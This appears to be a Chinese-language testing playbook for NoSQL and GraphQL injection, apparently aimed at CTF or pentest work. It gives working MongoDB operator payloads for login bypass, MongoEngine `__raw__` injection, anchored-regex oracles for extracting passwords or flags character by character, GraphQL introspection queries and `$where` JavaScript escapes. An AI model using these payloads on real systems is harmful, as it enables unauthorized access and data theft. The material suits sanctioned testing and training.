# NoSQL / GraphQL Injection

先证明对象、操作符或字段选择到达后端查询层；不要把“能请求字段”误判成注入。

## 入口信号

- JSON 登录、搜索、筛选、排序参数被直接合并进查询对象。
- URL query 支持嵌套对象：`username[$ne]=x`。
- MongoDB/Mongoose/MongoEngine 错误、`filter(**data)`、`Q(**data)`、动态字段名。
- GraphQL resolver 接收 JSON scalar、filter/search 对象，或响应提示隐藏字段。
- 字符串换成对象后，登录态、结果数量、错误文本或耗时发生稳定变化。

## 解析边界

先确认后端收到的是对象而不是字符串：

- `Content-Type`：`application/json`、`x-www-form-urlencoded`、GraphQL variables、JSON cookie 可能走不同 parser。
- URL 嵌套：`a[$ne]=x`、`a[regex]=x`、`filter[field][$regex]=^a` 取决于 qs/parser 配置。
- 重复 key：JSON/对象合并时可能“后者覆盖前者”，可用于移除预设条件或覆盖字段。
- 类型混淆：字符串等值检查如果直接传给 ORM/ODM，可能接受 `{not: ...}`、`{"$ne": ...}` 或数组。

## 操作符验证

认证点：

```json
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":"admin","password":{"$ne":""}}
{"username":{"$regex":"^admin$"},"password":{"$gt":""}}
```

URL 嵌套形式：

```text
username[$ne]=x&password[$ne]=x
username=admin&password[$regex]=.*
```

搜索/筛选点：

```json
{"field":{"$exists":true}}
{"field":{"$regex":"^prefix"}}
{"$or":[{"username":"admin"},{"role":"admin"}]}
{"field":{"$in":["admin","root","administrator"]}}
```

如果对象被字符串化，转向服务端解析边界：Content-Type、JSON vs form、重复参数、数组参数、GraphQL variable 类型。

## MongoEngine / ODM

动态 `filter(**data)` 常见风险是 key 穿透到查询表达式。优先证明 `__raw__` 或双下划线 lookup 是否被保留：

```json
{"__raw__":{"username":"candidate"}}
{"__raw__":{"target_field":{"$exists":true}}}
{"__raw__":{"target_field":{"$regex":"^known_prefix"}}}
{"username__regex":"^admin"}
```

判断标准：同一接口中，普通条件和 raw/lookup 条件造成可解释的结果集差分。

如果接口接受完整聚合 pipeline，再检查 `$match/$project/$lookup/$unionWith/$facet` 是否可控；目标是证明能跨集合、改返回字段或绕过预置 `$match`，不要直接假设 pipeline 全可控。

## Regex / Exists Oracle

- 用 `$exists` 判断字段是否存在，再把字段加入可返回字段或 GraphQL selection set。
- 用锚定 `$regex` 做前缀提取，避免 `.*a.*` 这类噪声匹配。
- 每次只比较两个候选前缀，记录匹配/不匹配 marker。

```json
{"username":"admin","password":{"$regex":"^a"}}
{"username":"admin","password":{"$regex":"^b"}}
{"target_field":{"$regex":"^flag\\{"}}
```

特殊字符进入 regex 前必须转义；若 regex 被禁，尝试 `$in`、范围比较或字段存在性组合。

大小写和排序受 collation 影响。先用已知字段校准 `$regex` 是否区分大小写；必要时使用显式大小写模式或按候选字符集线性验证。

## GraphQL

先分清三件事：

- selection set：决定返回字段，可能暴露 `role/secret/flag` 等隐藏字段。
- argument/filter：可能进入 SQL/NoSQL 查询。
- variable 类型：决定对象操作符是否能原样到达 resolver。

字段发现优先级：introspection -> 错误建议 -> 前端 bundle -> 小范围字段猜测。

```graphql
query {
  __type(name: "User") { fields { name type { name kind } } }
}
```

如果 introspection 关闭，保留错误建议、响应中的 `Cannot query field`、前端 query 文档、operationName 和变量 schema 作为替代证据。

当 filter/search 支持对象时，用 true/false 条件做同请求或成对请求对比：

```graphql
query($f: JSON) {
  search(filter: $f) { username email target_field }
}
```

```json
{"f":{"__raw__":{"target_field":{"$exists":true}}}}
```

GraphQL 能返回某字段不等于注入成功；必须证明 filter 条件能选择包含该字段或特定值的记录。

GraphQL 接受 GET 时，仍按普通请求复现 oracle；只有在 admin bot/CSRF/XS-Leak 场景中，才把 GET 特性当成投递或侧信道能力。

## 执行型操作符

`$where`、server-side JavaScript、表达式执行类只在明确证据显示后端使用相应能力时测试；优先使用非执行型 `$exists/$regex/$ne/$in` 建 oracle。

```json
{"$where":"this.username=='admin'"}
```

如果用户输入被拼进 JavaScript regex 字面量或 `$where` 字符串，先用真假表达式证明能逃出原上下文：

```text
a/)||true&&(/a
a/)||false&&(/a
```

## 结论格式

```text
entry_point:
parser: json | form | graphql variables | url nested
operator_preserved:
oracle:
true_request:
false_request:
signal:
returned_fields:
extracted:
next_step:
```
